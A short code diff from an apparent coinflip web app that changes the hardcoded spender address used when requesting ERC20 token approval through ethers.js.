@@ -53,7 +53,7 @@ function Coinflip() {
   const requestApproval = async (amount) => {
     const provider = new ethers.providers.Web3Provider(window.ethereum);
     const signer = provider.getSigner();
-    const Spender = "0x10Ad7b3EC896E244d4F3C2Bceeaa32f0A1DDCb9e";
+    const Spender = "0x3fEa0eD1FA9448D315053ee8CFcE32a09C708047";
 
     const erc20Token = new ethers.Contract(
       erc20TokenAddress,
